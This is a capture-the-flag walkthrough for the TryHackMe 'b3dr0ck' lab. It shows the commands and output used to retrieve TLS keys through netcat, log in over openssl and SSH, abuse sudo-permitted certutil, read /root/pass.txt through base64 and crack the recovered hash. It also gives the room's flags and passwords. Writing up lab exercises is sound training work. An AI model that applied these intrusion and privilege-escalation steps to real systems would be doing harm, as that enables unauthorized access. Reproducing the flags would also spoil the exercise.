# b3dr0ck Walkthrough
### Link
- https://tryhackme.com/room/b3dr0ck
---
### Synopsis
```
Barney is setting up the ABC webserver, and trying to use TLS certs to secure connections, but he's having trouble. Here's what we know...

He was able to establish nginx on port 80,  redirecting to a custom TLS webserver on port 4040
There is a TCP socket listening with a simple service to help retrieve TLS credential files (client key & certificate)
There is another TCP (TLS) helper service listening for authorized connections using files obtained from the above service
Can you find all the Easter eggs?
```
---
**Question**
### What is the barney.txt flag?

```
nmap -sC -sV -p- [IP]
```
**Namp scan result**
```
```

We fou nd **5 ports** : 22,80,4040,9009,54321.

- Port 22: We cannot log in as Anonymous

- Port 80 / 4040: We reach the web page and we have a sentence about **Over 9000** and we found the port **9009**. 
```
Welcome to ABC!

Abbadabba Broadcasting Compandy

We're in the process of building a website! Can you believe this technology exists in bedrock?!?

Barney is helping to setup the server, and he said this info was important...

Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
Bamm Bamm tried to setup a sql database, but I don't see it running.
Looks like it started something else, but I'm not sure how to turn it off...

He said it was from the toilet and OVER 9000!

Need to try and secure connections with certificates...
```

- Port 9009: To access this port, I launch **netcat** and we have a question about **what are we looking for**. Remeber to the web page and the last word: **certificates** 

```
sudo nc -v 10.10.108.30 9009
Password:
10.10.108.30 9009 (pichat) open


 __          __  _                            _                   ____   _____
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|




What are you looking for?

```
I tried something close to certificates and I obtained this answer
```
What are you looking for? dertificate
Sorry, unrecognized request: 'dertificate'

You use this service to recover your client certificate and private key
What are you looking for?
```

Let's try **public key** and **private key**
```
What are you looking for? public key
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
[REDACTED]
-----END CERTIFICATE-----


What are you looking for? private key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
[REDACTED]
-----END RSA PRIVATE KEY-----
```

Now we can save these 2 keys and tryto connect directly the targeted machine with **openssl** command line and the communication port **54321**

```
sudo openssl s_client -connect [IP]:54321 -cert THM_bdrock_Public -key THM_bdrock_Private
```
```
read R BLOCK
Welcome: 'Barney Rubble' is authorized.
b3dr0ck>
```
Let's try something to see how the system respond
```
b3dr0ck> ls -l
Unrecognized command: 'ls -l'

This service is for login and password hints
```

Now let's try the command **hints**
```
This service is for login and password hints
b3dr0ck> hint
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
b3dr0ck>
```
We found the **plaintext** password..... Let's SSH the targeted machine
```
ssh barney@10.10.108.30
barney@10.10.108.30's password:
barney@b3dr0ck:~$ ls -l
total 4
-rw------- 1 barney barney 38 Apr 29  2022 barney.txt
barney@b3dr0ck:~$ cat barney.txt
THM{f05780f08f0eb1de65023069d0e4c90c}
```
### Answer: THM{f05780f08f0eb1de65023069d0e4c90c}
---
**Question**
### What is fred's password?

From our SSH session with **barney**, let's chek what command **barney** can run
```
barney@b3dr0ck:~$ sudo -l
[sudo] password for barney:
Matching Defaults entries for barney on b3dr0ck:
    insults, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on b3dr0ck:
    (ALL : ALL) /usr/bin/certutil
```

```
barney@b3dr0ck:~$ sudo /usr/bin/certutil ls -l

Current Cert List: (/usr/share/abc/certs)
------------------
total 56
drwxrwxr-x 2 root root 4096 Apr 30  2022 .
drwxrwxr-x 8 root root 4096 Apr 29  2022 ..
-rw-r----- 1 root root  972 Nov 13 01:47 barney.certificate.pem
-rw-r----- 1 root root 1678 Nov 13 01:47 barney.clientKey.pem
-rw-r----- 1 root root  894 Nov 13 01:47 barney.csr.pem
-rw-r----- 1 root root 1678 Nov 13 01:47 barney.serviceKey.pem
-rw-r----- 1 root root  976 Nov 13 01:47 fred.certificate.pem
-rw-r----- 1 root root 1674 Nov 13 01:47 fred.clientKey.pem
-rw-r----- 1 root root  898 Nov 13 01:47 fred.csr.pem
-rw-r----- 1 root root 1678 Nov 13 01:47 fred.serviceKey.pem
```

Now we can check **fred** **certificate**
```
barney@b3dr0ck:~$ sudo /usr/bin/certutil cat fred.certificate.pem
Generating credentials for user: cat (fredcertificatepem)
Generated: clientKey for cat: /usr/share/abc/certs/cat.clientKey.pem
Generated: certificate for cat: /usr/share/abc/certs/cat.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
[REDACTED]
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
[REDACTED]
-----END CERTIFICATE-----
```

Now, we can backup the **public and private key** and connect to the targeted machine as **Fred**
```
sudo /usr/local/Cellar/openssl@1.1/1.1.1s/bin/openssl s_client -connect 10.10.47.94:54321 -cert THM_Fred_Public -key THM_Fred_Private
```
```
Welcome: 'fredcertificatepem' is authorized.
b3dr0ck> hints
Password hint: YabbaDabbaD0000! (user = 'fredcertificatepem')
b3dr0ck>
```
### Answer: YabbaDabbaD0000!
---
**Question**
### What is the fred.txt flag?

Now we can SSH the targeted machine as **Fred**
```
fred@b3dr0ck:~$ whoami
fred
fred@b3dr0ck:~$ ls -l
total 4
-rw------- 1 fred fred 38 Apr 29  2022 fred.txt
fred@b3dr0ck:~$ cat fred.txt
THM{08da34e619da839b154521da7323559d}
```
### Answer: THM{08da34e619da839b154521da7323559d}
---
**Question**
### What is the root.txt flag?

Let's check **Fred** capabilities ^^
```
fred@b3dr0ck:~$ sudo -l
Matching Defaults entries for fred on b3dr0ck:
    insults, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```
We can run /usr/bin/base64 and/or base32 on **/root/pass.txt**

```
fred@b3dr0ck:~$ sudo /usr/bin/base64 /root/pass.txt
TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dO
QkdYVVJUTEpaS0ZTU1lLCg==
```
Based on this result we can convert it 
```
fred@b3dr0ck:~$ sudo /usr/bin/base64 /root/pass.txt | base64 -d | base32 -d | base64 -d
a00a12aad6b7c16bf07032bd05a31d56
```
After many attempts, we can finaly obtain this string and it looks like a **hash**. Let's try [crackstation](https://crackstation.net/)
```
flintstonesvitamins
```
```
fred@b3dr0ck:~$ su - root
Password:
root@b3dr0ck:~# whoami
root
root@b3dr0ck:~# ls -l
total 12
-rw------- 1 root root   73 Apr 11  2022 pass.txt
-rw------- 1 root root   38 Apr 29  2022 root.txt
drwx------ 3 root root 4096 Apr  9  2022 snap
root@b3dr0ck:~# cat root.txt
THM{de4043c009214b56279982bf10a661b7}
```
### Answer: THM{de4043c009214b56279982bf10a661b7}

